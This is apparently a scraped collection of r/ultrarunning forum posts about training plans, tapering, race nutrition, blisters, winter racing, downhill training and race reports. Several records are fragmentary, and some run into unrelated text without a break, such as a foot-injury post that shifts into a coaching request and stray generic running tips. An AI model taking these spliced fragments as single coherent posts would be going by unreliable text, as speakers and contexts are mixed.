A more relaxed approach to training?,"Hi, long time lurker, twice road marathoner and first time ultrarunner here! English is not my first language, apologies for any mistakes. 

TL;DR: Very mediocre runner takes her running wayyyyy too seriously to the point of obsession. All game and no fun. Looking for advice. 

For both my road marathons I (34F) used the Pfitzinger 18 week, 55 mile training plans. I really enjoyed the overall mileage and mid-week long runs and found the plans quite doable. 

I followed the plans very strictly. The first time I think I really followed 98% of the plan to a T with all mileage at the prescribed paces. It worked well and I did pretty good on my first marathon, but really prioritized training over everything else (work, relationship, social life) and frankly, I think it crossed the line from what is supposed to be a relaxing hobby to more obsessive territory. Especially considering I am an extremely middle-of-the-pack runner (PB on the second marathon was 3:53), I really don't need to obsess over my training plan to the point that it takes the fun out of it and hurts other aspects of my life. 

My training block for the second marathon was less strict and I missed a few runs and workouts due to vacation logistics, depression and COVID-shots side effects. I still better than I expected during the race, but I have beaten myself up about the 'failed' training plan. 

I'll be running a 44 mile ultra in the spring and will start my training block soon. This is my first ultra. I would really like to approach this block with a more relaxed approach to training. Still putting in the mileage, but be less anal about it. 

Any advice and wisdom is very much appreciated.",ultrarunning,1635968893
Foot issue after first 50k,"I posted a few weeks ago about training for my 50k and proudly report that I completed it and was not DFL! I was, however, about an hour over my estimated time due to poor fueling and very long climbs. Overall, I'm super pleased, though, and looking at more races.

Which brings me to my question: I posted in the general running sub trying to describe my foot issue after my race. It isn’t trench foot nor blisters, per se. (Photo \[here\]([https://imgur.com/a/2a3XoVY](https://imgur.com/a/2a3XoVY)) ) it’s like weird little tears between the lines of my feet that hurt. What is this? How do I not get it again? Also in the pic, under the ball of my foot is kind of a blister/bruise, ? I don’t typically ever get blisters or feet issues so I don’t know how to prevent this. Didn’t wear anything new, lubed my feet, and while they did get a little wet here and there, no major water crossings or wet for long periods.

I've got goals and events in mind for next year (some solo local runs, one established 100 miler), and I already do a lot of targeted hill strides mostly as it's really time efficient, but I'm looking for someone to help me with actually setting a decent structure to it all.

Winter Ultra - 50 KM (Training &amp; Gear Beta?),"A local Winter Ultra was just announced on the 27th of this month and I'm thinking of running my first 50 KM trail course. I've been recovering from Patello Femoral Syndrome in my right knee since 2015 which has hampered my longer distance efforts altogether. With that in mind I don't have any time objectives in mind, just a finish would be magnificent as I have no idea how my knee will feel past marathon distance. I have a home treadmill &amp; gym and I'm very close to the race course so access to elevation/terrain isn't an issue to do a really condensed training cycle. Here are some observations/concerns ranked from most important to least important:

**Training** \- Not going to really follow any training plan, just focusing on time on feet for the next 3 1/2 weeks and doing 1 hour of strength training a night, probably a combination of  30 minutes conditioning ([https://fitness.mtntactical.com/exercises/](https://fitness.mtntactical.com/exercises/)) and 30 minutes of rowing. I work half of the day from home so can walk on the treadmill at an incline for 3 hrs a night and run for an hour in addition to doing the hour of strength. Suggestions on how to transition casual running fitness to a chill ultra distance? Will the above regiment 5 days a week and one long (2-4 hour Run on course) 3x before race day on course outdoors be sufficient mileage/distance for race day?

**Blisters** \- For some ungodly reason my heel &amp; toe skin is very blister prone in recent years. I run trail in  a trusty pair of La Sportiva Ultra Raptors but it doesn't matter which kind of synthetic sock I use, my heel or baby toe develops a blister. Tips on how to mitigate this on an ultra run? How many times would you change socks during this distance?

**Temperature** \- Course runs 100% along the River Valley and forecast puts seasonal temperatures between -8°C (high) to -15°C (low) but my thoughts are that it will be colder as I will be running adjacent to a frozen river. I have appropriate clothing and will layer with base layers &amp; Gor-Tex etc. For Winter Ultra runners, can you offer any tips with acclimatizing to temperatures/staying warm while on course?

**Terrain -** Packing some Yaktrax Pro and 1 Black Diamond Carbon Z pole for stability on the ice. Any tips in this area?

**Hydration -** The course appears to be self-supported in a 25 KM circle. I have a Nathan Vapor Airess Vest with a 2L bladder but I drink a lot of water while I run so I'm a little worried about running out of water on course. Basing this assessment on my first 25 KM baby ultra where my bladder was bone dry at the 12 KM aid station. Would it be a worth investment to get soft hand bottles for the front pockets? 

**Nutrition -** Digestion isn't an issue so I can eat throughout the run. I like Lara Bars, 'Made Good' Rice Krispies or Go Macro Bars and will bring Gels, NUUN &amp; Salt Tabs in my pack. I'm also thinking of a drop bag at the 25 KM aid station for some loaded Sweet Potatoes, Fruit, Tapioca Pudding and a Waffle PB&amp;J. Suggest your favourite Vegan nutrition?

**Watch** \- Will be wearing my Garmin VivoActive 3. Will it last all day??? haha

Six-day race history part 1," 

How far can you run/walk in six days? The six-day challenge, perhaps the oldest ultrarunning event, has roots back nearly 250 years. In 1773, Foster Powell of London, England, ran 400 miles from London to York and back, setting the six-day standard that was the quest of dozens of ultrarunning “Pedestrians” for the decades to follow in the early 1800s. This is part 1 of the fascinating history of the six-day races, still held today.

Mild runner’s knee before race,"I just started my taper ahead of a fifty miler in three weeks.

It doesn’t hurt while running, but it gets very stiff and hurts while sitting. I have to extend it to relieve the pain. Ice, foam rolling, and elevation also help; ibuprofen makes the pain go away. I think the best thing is to rest a bit extra, but I’m worried about tapering too much and jeopardizing my race.

Pacing thoughts + kinda 6hr report,"Hi gang,

I had a pretty fun longest run of my life yesterday here on the Oregon Coast in the [Dia De Los Muertos endurance run](http://www.ardoradventures.com/ddlmer/). They held 6-, 12-, and 24-hour events of a 2.4 (ish) mile mixed surface loop; I took on the shortest one, and in the week leading up I was hoping to hit 18 laps or 43 miles.

That would mean about an 8:22 average. I'd never gone over the 50K distance before, but figured I'd at least take a shot at my goal distance. I'd gone sub-4 for 50K (\~7:40 pace) earlier this year on a much harder course, so... it wasn't TOTALLY preposterous as an idea.

I also knew my actual ""moving"" pace would of course have to be faster than 8:22 to account for aid station visits and bathroom times. I still managed to overdo it just slightly to start the day (hitting 8:00 rather than 8:10s) but felt generally comfortable. Slowed a bit to the mid-8's as I got up closer to 20 miles, but still was generally within reach of my 43 mile goal... until my ""reasonable"" pace slowed to high 8's, low 9's, mid 9's. Ah, crap. I re-evaluated and figured out what I needed to do to safely hit 17 laps (\~40 miles) and cruised in for the last hour.

All the gory details here on Strava: [https://www.strava.com/activities/6189453230](https://www.strava.com/activities/6189453230)

So when all was said and done, I got my ""B"" goal and won the 6 hour and had a great day, but am still left wondering what I could've done differently to get closer to squeezing in that coveted extra lap. It's entirely possible the answer is just ""nothing"" given how I'd trained the last few months (consistent 50-55 mpw but short on long runs &gt; 15 miles, aside from one 50K at the start of October).

But for the sake of discussion... if your goal pace for a race is 8:22 (or 9:22, or 10:22, or whatever else), what does the ideal mile one actually look like? Your halfway mile? Your 80% finished mile?

I’m training for my first marathon and found this training plan does it look good?,,ultrarunning,1635621571
tips for my first B race 50k (3 wk before a 50mi),"Since the start of the pandemic I've run 5, mostly solo, 50k-ish efforts, plus a couple trail/gravel marathons. Finishing times: 6 hours (33 mi on a looped course), 6:30 (virtual 50k), 7:30 (solo unsupported 50k carrying 4l of water at the start), and 8 hours (8 yards of a backyard ultra). The fifth and most recent effort was the four state challenge last June (44 miles on the MD AT in 12 hours).

My long runs this training cycle included a flat gravel marathon (3:54) in early September. Last weekend I did a flat out and back 25mi on another gravel trail in 4:05.

I'm running the JFK 50 in three weeks and this Sunday, for my last long run, I've signed up for a local 50k that I've always wanted to do (trail, 4k of vert).

Here's what makes me nervous: 

1. It's essentially my first time running with other people since the pandemic and I know that's going to want to make me go faster. If this were an A race I'd be trying to podium.

Is an ultra for a college student feasible?,"Hello all. As the post states, I am a college student wanting to try his hand (feet?) at a 100 miler. I am currently building up my mileage as its been awhile since I have ran long distance but I have been biking pretty avidly along with rock climbing. Looking to run it in April-May of next year. I have a route that I have biked recently which is mostly paved or crushed limestone with around 2000-3000 feet of elevation. [My Ride](https://strava.app.link/7bAAuKf2Jkb) It would be on my own with a group of friends who would be my crew. The longest distance between towns is 13 miles however there's plenty of intersections between each town to meet. Obviously I have a long ways to go regarding training, but if I did the run to run 100 miles would it be feasible? I wouldn't be running it for time as much as to cover 100 miles on my own two feet. Slow as beans if that is what I need. 

I would love to hear your thoughts!",ultrarunning,1635485622

Taper Advice,"Well hello! 

I am just under two weeks out from my fourth ultramarathon. This one will be my biggest adventure yet as it is a timed 8-hour trail loop race. For my last races, the longest distance I covered was 38 miles and my goal for this is either 48 or 52 (it's a 4 mile loop).

My typical training pattern that seems to have worked well so far is to run 40-50 miles per week, then have two 60-65 mile ""peak"" weeks and then taper the last two weeks, **but I am conflicted about the ""right"" number of miles during those last two weeks.**

My thought is to maybe do 40-45 this week and then 20 next week before the race.

Does that seem right?

I do not do any speed work - I just run.  Would it benefit me for any of these lower mileage weeks to include more tempo-speed runs?

Sleeping in a bivy during a trailrun?,"Hi all,

I signed up for a 250K race through the Belgian Ardennes. I would suspect I wouldn't be able to cover this distance without some sleep for at least a couple of hours. Especially since the course is unmarked and everything has to be done with map and GPS on very technical terrain. So I can't afford a lot of sleep debrivation.  
The cut-off time is based on an average of 4 km/h so that should give me some time to get a few solid hours of sleep. There's 4 checkpoints at 60, 125, 160 and 200K. I'm not sure when to sleep but probably at 125K.

Now the race is in february so the conditions can be anything from snow to rain, freezing colds etc.

So I probably need a bivy to sleep in. I wonder what you guys recommend. Plus should I carry one with me or put it in the dropbag? I guess putting it in the dropbag will save me some weight but on the other hand, I won't be able to sleep earlier if needed to.

Anybody has any experience with this? And yes I'm scared, why the hell did I sign up :)",ultrarunning,1635336381

Transitioning from Ironman to 100 miler,"I’m an ultrarunner turned triathlete that just competed my first Ironman this month. My background consists of multiples marathon/50ks and was trained for a 50 miler that got cancelled because of COVID. I took that time afterwards to transition to triathlon and recently completed my first Ironman in just under 12 hours. I’d now like to switch back over to ultrarunning and feel like having my goal set as a 100 miler is more appropriate than 50 miles at this point. I’d still use 50 miles as a B race but have the 100 miler as my A goal in 2022. Does anyone have any experience going from an Ironman to 100 miler that they’d like to share? I’d potentially be targeting an April race but could push it all the way back to October if needed. I was currently thinking to just ramp up my milage as slow and steady as possible to ~70 miles per week (I would typically peak at 65 during my previous training and felt excellently prepared during my races) (I’d also love to hear if anyone has advise on how to incorporate cycling/swimming into an ultra training program). For my first 100, my goal would simply be to finish within the cutoff. Do you think Rocky Raccoon in February would be doable? Or maybe push it off until the Potawatomi 100 in April? I also have a local 100 (Indiana Trail 100 in October) that could be an option. I feel very confident in my endurance abilities and training work ethic, I just have never gone past 12 hours.

Heartbroken: Anti-vax RD,"In the middle of a pandemic that’s already killed over 3/4 million Americans in the past year and a half, an RD for some well-regarded 200-mile races has chosen to tweet a rant about Los Angeles restaurants requiring the checking of vaccination cards, saying this will force unvaccinated people to become second-class citizens (I disagree with this if they offer a test result option). I don’t see it much different than a bar carding people or not allowing smoking—it shouldn’t be a big deal (you don’t like it, don’t eat there).

I’m saddened that she feels this way, because as important as personal freedom is, my right to freedom doesn’t trump your freedom to live… but I’m alarmed that she’s chosen to take this public stance. I’m concerned that her race will start to attract like-minded people (as both race participants and aid stations volunteers)… and the last thing I want to do is support a race that becomes known as a haven for anti-vaxxers.

First ultra,"Hello friends, I'm a long distance backpacker looking to transition into Ultra's. I learned about them while hiking the AT and became very intrigued, Then I witnessed one being ran on the PCT and it looked like so much fun. 

Thru hiking has been great but I need to take care of some real life stuff for the next year or two and it's a lot easier to free up a weekend or two than it is to take four months off lol. Plus if I don't start planning/training for something I might  go insane (more so than I already am).

I have no idea where to start in terms of distance. My legs and feet are no strangers to big miles. 180+mpw on rough mountainous terrain is pretty routine. My best effort so far was a 24 hour challenge in Oregon, I was able to complete just over 85 miles with 10k elevation gain with a moving time of 21 hours 32 minutes. I definitely could have picked up the pace but I didn't wanna risk an injury and jeopardize my thru. I was unsupported and carrying my pack. 

Obviously these are two different worlds and I know I have a lot of learning to do. Has anyone on here ever made the switch or know somebody who has?

## Steps how to start running:

* The very first thing you want to do when learning how to run is figure out how far and how fast you should be going. You can measure this by using a heart rate monitor or an app on your phone that tracks the distance traveled, time taken, speed of movement, Etc.
* The next thing you want to do is stretch thoroughly. Don't forget the stretches for your calves and glutes! This will reduce how many injuries occur when running. Make sure you don’t overdo it though, otherwise you might pull a muscle or hurt yourself further instead of helping.

### Goals
| Goal | Description | Completed? |
|------|-------------|------------|
| A | Marathon | *Yes* |
| B | 20 miles | *Yes* |
| C | Have fun | *Yes* |


### Training
I didn't train for this race. I had my main goal race, a 50 miler, on 9/25. I figured I'd coast between races, which is pretty much what I did. I took 9 days off after that race, did mostly easy runs, one speedwork session, and one 20 mile long run in the interim. The long run was for a different race's training and was way faster than what I'd do training for this..and it was last Sunday, so, uh, not my smartest move. I didn't have a true goal for this race, it was my first time running the format. 

### Pre-race
I jumped in puddles on purpose on Thursday's trail run. I then realized last night that my shoes were not dry, and un-backlaced them to let them dry. I wore a skirt and a thermal top, but packed other options for the bag area. I felt weird having not prepped anything for this race, I was very unprepared.  I showed up 30 minutes before the start. It was around 39 degrees, sunny, gorgeous running weather. We had a pre race meeting (then went right into the start) slightly before I was ready with no warning, so I shoved my shoes on quickly and didn't back laced them. I had many friends to run with, and I was mostly there to have fun with them. 

### Race
The race is a 6 hour event where you run a 1.7 mile loop as many times as you can in that period. The loop has some scrambling, some gravel, hills, and some nasty rocks with gaps in one section. 

Pretty quickly it became evident that my stomach was not happy. I was painfully bloated and had some GI issues. I also overheated immediately, so shed a layer and grabbed a tank after the first lap. Delay one! 

Then I needed the bathroom on lap two.  My stomach continued to be painful for at least two more laps. On lap three, I finally decided to relace my shoe properly. Much better, but I still wasn't happy. I started really feeling down. I knew I wasn't trying to race, but all my friends were ahead or far behind me. I hated that I wasted time on shoes, bathroom, and changing. 

Well, after a few laps of thinking about quitting, I realized my stomach felt better. I had continued taking my nutrition, perhaps a gamble, but it worked. I felt better the longer I ran, though the splits don't really tell that story. By the time I ran 22 miles, I did math and realized I was close to hitting 50k but probably wouldn't be able to swing it. 

I did my last official loop, but told the RD I was still going to 50k, but I knew it was done. My friend joined me for the painful last mile-ish. I hadn't mentally prepped myself for doing an ultra, and I also hadn't prepared!

### Post-race
We all left earlier than usual post race. There weren't finishers to wait for since we all finished at the same time! The swag for finishing is a glass, completing my set for the set of races put on by the RD. It was awesome seeing all my friends hit their goals, but I was eager to get home and relax.

"[Race Report Video] The 2021 Cloudsplitter 100 in Norton, VA, US","Hey everyone,

I've gotten a lot of help from this reddit in the past by reading race reports and watching other's race videos. In return, I wanted to share my experience this past weekend at the Cloudsplitter 100. This was my A race for 2021 and I trained all year to make it successful. 

I filmed myself throughout the race and cut it all together during recovery (I couldn't walk for a couple days after the race so I had plenty of time!). YouTube has finished processing the video and I've got it scheduled to premiere at **7PM EST tonight, link**:

 [**The Cloudsplitter 100 Mile Ultramarathon - Norton, Virginia - 2021 - YouTube**](https://www.youtube.com/watch?v=wHeEvft-iww) 

This is a long video at an hour and 20 minutes. It may be too long for some, but I believe it does the race justice and will serve as a useful resource for future runners. I love Kerry Ward's channel, he does long race videos like this, so I tried to mimic his style with just a bit more editing. 

 A little about Cloudsplitter. It is held in Norton, Virginia, US. The town of Norton is a special place. The Norton community activates around this race and it's an incredible orchestra to behold. A HUGE thank you to all the volunteers who helped with this race and an even bigger thanks to my dad and wife for crewing me on this journey.   

I would not consider Cloudsplitter a particularly scenic race. Despite its name, there aren't great mountain vistas waiting to greet you around every bend but there is plenty of climbing and it stunningly beautiful to run the trails at their peak fall foliage. What makes Cloudsplitter a unique challenge is that it is a difficult and rugged mountain race featuring miles and miles of rock gardens, over 50 creek crossing, blistering cold mountaintop winds, and at least 19,000+ ft of vertical gain (5800+ meters) that is heavily back-loaded in the last 25 miles. It gets max UTMB points and has a 40-hour cutoff. It's not the most popular race but I would argue that this year's race had a very strong field of runners toe the starting the line.  

The running, filming, editing, all of the work that I put into this video is the cumulative result of a TON of training and practice. I'm NOT a videographer, professional runner, aspiring YouTuber, none of that. I welcome your constructive criticism as I do intend to continue making race videos in the future as I take on new challenges. I want my videos to standout and be both informative and entertaining. Running long distances is my passion, and this video my passion project. I hope you enjoy. Leave me a comment below with any questions about the race or about how I filmed it. Please share this video if you know someone interested in this race. I'd love to hear your suggestions for my next hundo.",ultrarunning,1634942125

First ultra in two weeks - haven't practice nutrition at all,"I got sucked into doing a race with my buddy in two weeks. I'm generally a pretty decent runner and have done 40-45MPW consistently for a long time now.

However, I haven't really practiced nutrition. I have a wide variety of gels I can use, and have my favorite flavors of Gatorade and whatnot, but I haven't practice running with ""real food"". 

BTW the format of the race is an ""all you can run"" 8-hour event on a 6-mile loop. I plan to consume one gel + water during each loop. Then between loops I was planning on drinking Gatorade + eating 100-200 calories of something else.

The problem is I'm not sure what that 'something else' should be at this point. I was thinking stuff like Pringles, pretzels, bread, banana, etc.

I have a final 18-mile training run this Sunday, so I'll try to simulate the race environment by taking a gel+water during each 6-mile segment (about halfway through), and then consuming 100-200 calories of real food to test some foods out. I also have a bunch of 5-8 mile training runs in the final two weeks so I can do some testing there (e.g. eat 200 calories of something, go run 7 miles a few minutes later).

I'm getting a bit nervous about this, and am looking for any advice on ""safe"" things I can do. Thanks!",ultrarunning,1634912949

Advice needed,"Hi. I am hoping someone will be able to assist me with a few questions that I have. I (31M) run every week, and have basically run every week for the past 6 months. I've been running for a better part of the last of 10 years. I'm currently hitting around 50 - 65 km/week. I run 10km a day at around 6 min/km, and one longer run on the weekends. I am not really running for any particular reason besides to keep myself out of trouble and as a form of meditation, given how stressful daily life is in general. 

Considering my somwhat high mileage for someone running just for the enjoyment of the process, am I doing any potential damage to my body? Is there any way in particular I should be structuring my runs, or is it largely fine for someone who is a casual runner not competing to just run in the way described above?

Thanks for any advice!",ultrarunning,1634842337

Need to get faster for Leadville next year and what I’ve been doing for the past year isn’t working,"I was supposed to run Leadville 100 in 2020, but we all know how that worked out. Because of life stuff I deferred until next year instead of trying to run this year. This will be my second attempt; on my first try I DNFed at Twin Lakes inbound because I missed the cutoff.

My problem is this: I’m incredibly slow. I’ve finished two 100 mile races, both with single digit minutes left on the clock for a 36 hour cutoff. My “average” pace is slower than 12 minute miles on relatively flat ground, and slower than 20 minute miles with lots of uphill (I live in CO.) If it’s relevant I’m female, late 30s, on the short side.

I’ve been running ultras for about 4 years now. When I started running, all my runs were the same pace. I heard the advice that “most people run their slow runs too fast and their fast runs too slow”, so I’ve tried going easier for most runs and hitting my speed work days hard. Well, all that’s accomplished is making my average pace even slower. I worked with a coach for about a year but that didn’t seem to help - my speed stayed the same.

I’m considering going back to the “do every run at the same pace” method, because at least then I was running 10-12 minute miles consistently.

Does anyone else have similar experience and was able to make themselves faster? Or perhaps I’m approaching this all wrong? I would appreciate any advice. The race is 10 months away but I really need to step it up if I want to finish! I’ve been dreaming about this race as long as I’ve been running and I have to believe that where there’s a will, there’s a way.",ultrarunning,1634832435
Are shorter weekly runs critical?,"I've done a 30k and many marathons in the last 10 years, now training for my first 50 Miler. I've increased my training to about 55 miles a week and my longest long run has been 30 miles. I'm 7 weeks out and plan to do another 30 miler, a 25 miler and a couple of back to back 20/15's.

After the 30 miler, I'm pretty tired and feel some old injuries whispering. I had to ice my knees, take meloxicam and take a full 2 days of rest to recover from it...no way could I have done a back-to-back run. This weekend I have a b2b 20/15 and I'm feeling nervous about keeping my weekday mileage high. 

Here's my question - Now that I have a decent training base (plenty of hill/speed workouts and steady 50+ base mileage) how important are the high mileage weeks? To avoid injury, should I put more focus on getting in the long weekend mileage or is it more important to keep the total weekly mileage up instead?? Obviously, keeping high weekly mileage and back to back long runs on the weekends is ideal and what my training calls for, but I'm really nervous about getting injured so close to the race.",ultrarunning,1634832265

Training for loooonnnng downhill efforts,"My white whale race is Run Rabbit Run. Over two attempts, I've got the basics down (altitude, climbing, endurance). In this year's attempt, I noticed that one area I could improve a lot is descents. In the first half, there's over 30 miles of descending trails, with one 20 mile long gradual descent. 

I live in Austin and have access to short hills. 200' vertical is the most I can get in one shot, but I have loops that cover up to 1,200' over 8 miles. Those, combined with strength workouts (step ups, squats, etc), incline/VersClimber workouts are enough for ascents. I trashed my quads this year on the descents and would love to incorporate some downhill specific workouts into my routine.

Koop has a few blog posts on the topic and the books (Essentials/Uphill) have some info. I'm curious to hear from the community what's been successful for you all, especially runners who don't have regular access to mountains.

Some topics for discussion:

* What targeted workouts have you found that work well for downhill training?
* What frequency do you do downhill specific workouts?
* How do you adjust your form/technique for downhill?
* On race day, how do you approach long descents?

Downhill Comrades runners, I'd love to hear your experience/tips. And RRR finishers, any strategy tips for the ""saving up"" for the final descent?",ultrarunning,1634741161

[Advice] First Ultra,"Signed up for my first Ultra. It will be the Bryce Canyon 50k. I currently run 20-30 miles a week. Sometimes much less if I’m out backpacking.

I’d like to eventually hire a coach. I just can’t afford it for the entire 7 months leading up to the race. In the meantime, I’m planning to use a generic 50k trail race plan downloaded off the COROS website just to get started on something more regimented. 

The plan has a lot of my runs for the first 10 weeks as “base runs” in which I start between 94-114 bpm. This seems extremely slow compared to my usual runs. At present I don’t really have any goals when I go out. I just run a different trail each day and try to have a good time! Usually this means keeping an approximate 10:00/mile pace (140-163 bpm), averaged across all splits with some decent climbs. I feel like starting between 94-114 will have me basically walking.

Any thoughts on generic training plans like this or concerns over pace and HR? I suspect my usual runs are too high of an intensity.",ultrarunning,1634516826

From what I understand the breakthrough cases are more mild, and mine has been a mid-grade cold for the most part.  Congestion, fatigue, body aches, a few chills and a small fever, but all in all not too terrible.  Is anyone further out from a breakthrough case and back to running?

### Training
I signed up for this race 7 weeks ago, with very little summer base training under my belt due to graduating from college, moving to Boston, and starting a new job. Training consisted of running when I felt like it, one workout a week (typically VO2 max intervals or Uphill Athlete's 30/30s), and weekend trail runs with moderate levels of vert (3000-4000 feet in 12 miles). My ""peak"" training effort was hiking the Presidential Traverse in the White Mountains of New Hampshire, which is 19 miles and about 9,000 feet of mostly very technical trail. I did this three weeks out from the race, after which I spent my weekends climbing, drinking with friends, and not running enough. To put it simply, I did not put the training in for this event and pushed through on sheer willpower, trekking pole use, and copious amounts of pickles, moral support, and Tailwind.

### Race
This was the first year Run it You Won't was offered by the newly formed Brown Dog Trail Races. They are not new to race directing, but this was their first event after making a move up to Vermont from Georgia. Glenn and Erin were incredibly kind and encouraging during the race and really did a great job putting on a fun and brutal old school trail race. The course took a winding path up the access roads and ski trails at the famous Mad River Glen, with the 6/12/24 hour races making our way all the way to the top before painfully trudging back down. The course was moderately wet at the start but became and absolute mud pit as intense storms kicked up about 6.5 hours in. The route they used was actually easier than the original plan due to some last minute changes, extending the distance and removing a bit of extra vert for a total of 4.9 miles and about 1900 feet of gain per loop. The race team claimed that their measurement tools actually put the course at around 2400 feet of gain per loop, which was backed up by the staff at Mad River Glen, but my Garmin consistently read between 1900 and 2000ft.

The day kicked off at 8:15 with the single loop racers leaving us in their dust as we began to trudge up the mountain. It immediately became clear that the crowd in the 12 and 24 hour races were a lot faster than I had expected, with many of the 24 hour racers dropping me less than 1000 feet up the mountain. The first three laps went smoothly, with the quad fatigue really setting in on lap 4. At this point I was completing loops alone, which made them much tougher. A wicked rainstorm started up as I was coming down lap 5 (I think), turning the loose grass sections of the course into sucking mud. I caught something of a second wind on lap 6, crushing out a fast one, but lap 7 was absolutely brutal. I nearly broke into tears as I was descending when I realized that I would have enough time to go out for one more lap and that I would have to do so for a chance at first or second place. After getting a pep talk from the RD and my girlfriend, I pushed out for one final lap in the pitch black, nearly losing my way several times in very thick fog at the summit. I hobbled down the mountain, finishing my eighth and final lap with about 18 minutes to spare, matching the first place winner in number of laps but not managing to keep up with him pace-wise.

This was my first time ever running a timed ultra and only my second ultra ever. I am very happy with the result I achieved, especially given my young age and lack of experience with the format. The concept of a vertical gain timed race is truly evil and I was completely broken after 12 hours. A MASSIVE shout out to the guy in the 24 hour race that matched me lap for lap (he was actually faster) who was planning on an insane 15 laps (about 68 miles and well over 30,000 feet of gain).

Tips on getting started,"Hi all, I (27F) am currently recovering from a minor knee injury (pathellafemoral pain syndrome). Before that (april 2021) I was moving towards incorporating running into my everyday life (running to and from work and what not). I did survival running, but I want to start training towards ultrarunning when I can run again.
A few things hold me back:
- Diet. I dont eat much meat and carbs. Do I need a meal plan or can I just eat when hungry?
- Eating during a run. I normally run 1-2hours in the morning on an empty stomach. When do you eat (gel or whatever) during a run? Also when you feel like it? Or before that :P
- Strength training. I am not sure what is meant by this exactly. But I hate fitness etc. I Just love to run, and I am hoping you guys Will Tell me I can train for a run by just running. I live alone (so all the chores are mine), work 48hours a week and have a social life... I dont really want to put time towards an activity I don't enjoy.

Hopefully you can shed some light and tell me if ultrarunning would fit my life, or maybe I am better off just running and climbing in survival runs :)

First 'ultra' completed despite awful cramping in calves- how do I avoid this?,"I put 'ultra' in scare quotes as it was actually officially a marathon distance but I missed a turned and ended up doing more than 43k. My first, by the way (45M, been training solidly for 3 years)

This was the Montaña Solidaria marathon, staring and finishing in El Escorial, about 40km North of Madrid, Spain. 1800m/6000ft vert on technical trails, including some hardcore steep uphills and downhills, stream crossings, fallen trees and some scrambling.

The first 25km were FUCKING AWESOME. The scenery around there is beautiful, I got to the halfway point in a cute mountain village well ahead of schedule. At that point we'd already done 2/3 of the vert and the day was going well beyond expectations. However, towards the start of the final climb my troubles began. Calves were repeatedly cramping, to the point where I had to massively adapt my gait to be able to continue, which led to deep pain on an atomic level for the last 10-12 km.

Thought about dropping out but managed to make it well within the cutoff, but had to walk much more than I wanted and couldn't deal well at all with the final descent. All in all I reckon I finished 45 minutes later than I could have.

As far as possible I'd like this not to happen again, obviously. Long term goals are a 60k next year, 80k the year after. This is Spain so all races at this distance tend to be technical and vertical.",ultrarunning,1634464377

I just hit 600 miles in a single pair, running 30-60mpw, on 50/50 road and very loose rocky trail in the San Juan Mountains. The longest day was 33mi 7000ft 

The shoes now look like a somewhat beat up old pair of sneakers. There are very tiny holes in the upper at the base of my pinky and big toe. The lugs are 90% worn away where I strike but surprisingly still there 

I will continue to use them for at least 200 more miles 

PROS 

- excellent foot hold 
- very grippy, they're almost sticky like a climbing shoe rubber 
- very tough 
- zero drop, wide toe box but not duck-foot wide 
- low to the ground, I've never once rolled my ankle in them, but not minimalist (John Kelly ran the 200+ mile Penine Way in them )

CONS 

- after ""only"" 300 miles the foam was so soft I could feel small pebbles underfoot. I put in the plastic rock plate from Altra Superiors and they were totally fresh again (which is surprising, as I couldn't even feel that thing working in the Altras)! They'd really benefit from a rock plate

"Aspiring 16 YO Ultra Runner, any tips?","Hi. I’m a 16 year old junior in high school and somewhat recently I started running a lot.

I was fed up with just running 5ks as I felt and still feel like after each I still have so much left in the tank. Anyways, I have run a couple half marathons on my own, and running my first actual competitive one in a couple weeks.

Feedback on Daily Eating and Nutrition Plan (IF + Keto) for Ultrarunning Training,"I train 14+ hours cardio per week (80/20 run/bike).

One area where I struggle and want to improve is eating habits. I love me sugar and desserts, and my level of training allows me to eat whatever I want without adding weight.

Still, I would much prefer healthy insulin sensitivity (and reduced inflammation) from an IF + Keto diet.

Does anyone use this model? How do you eat enough calories on low carb? Do you bonk - or do you continue to fuel 300 cal per hour carbs during your workouts (breaking the IF and Keto)? What about races - how do you fuel?",ultrarunning,1634389042

I stumbled across a post about a 6/4 run walk plan. This got me thinking. What would be the best run/walk plan, and how critical is it to start doing it from the very beginning?

Here is what I'm thinking, run the first 5-6 miles (first drop bag), then implement a 10/5 run/walk. Or should the plan be implemented immediately for it to work? 

This is an almost flat course! My watch showed 900 feet last year, so there aren't any hills to plan around.

I am planning to try out this pace plan on a 20 mile this weekend. Unless someone advises on a better plan. I essentially have 3 weeks to test out whatever I decide on. I know this isn't much, but my other plan is to run 4.5-5 mph as long as possible and walk when needed....",ultrarunning,1634252659

\### Training

I'm a relatively new runner, and 2021 is the first year I ran regularly and followed a training program. I began running in 2019 when a friend convinced me to sign up for a trail half marathon (Mount Robson half-marathon), which I enjoyed though found quite challenging because I wasn't well trained for it. At the start of the pandemic in March of 2020, I began running more frequently due to gyms and some of my other hobbies all being closed, though I was only running 1-2 times a week and didn't regularly run any further than 10 kilometres. I didn't run much over the winter of 2020-2021, but I nordic and backcountry skied quite regularly and cycled on an indoor trainer \~2 times a week, which helped keep my fitness level up.

In April of 2021, a friend and I decided to sign up for a 50 mile ultra relay (\~54 miles, \~4,000 m elevation) scheduled for August 14th (Iron Legs - [https://www.ironlegs.ca/relay](https://www.ironlegs.ca/relay)), which was when I began training more regularly. I didn't follow a specific training plan, though my brother put together a rough training schedule as he has an exercise physiology background and was running in the race too. In general, I did 3-4 runs per week including 1 run with speedwork or hills and 1 long run, and 1-2 days of cross training (mostly cycling, some hiking). I gradually ramped up my mileage to a peak of 55 km/week in mid-July. My longest training run before the first race was a 37 kilometre trail run all on portions of the course I would be racing on. I didn’t do any back to back long runs, though there were a few times I did a long run followed by a long bike ride the next day, vice-versa, or a hike and a trail run in the same day. I didn’t experience any major injuries or setbacks, though had some knee pain that caused me to cut a few runs short in July. I suspect this was due to an IT band issue, and I used a physio routine my brother had for a similar issue and that seemed to resolve the problem.

The 50-mile relay went okay, though I went out a little too fast at the start, I didn't take in enough salt which resulted in some bad cramping, I had some stomach issues late in the race, and I ended up walking most of the last 15 kilometres. It was also quite hot (\~30oC) and smoky on the day of the race, and I effectively ran the last 30 kilometres by myself which I found quite mentally challenging.

After that race, I had about a week of lower mileage and intensity before beginning to ramp up again for this race. On a whim, I signed up for and ran the Banff Half-Marathon on September 12th (1:36:01) as I was going to be in that area that weekend. This race helped pick my confidence back up after struggling in the 50-mile relay, as I finished with a quicker time than I expected to. My mileage peaked three weeks before the race with 62 kilometres and a 32 km long run.

\### Pre-race

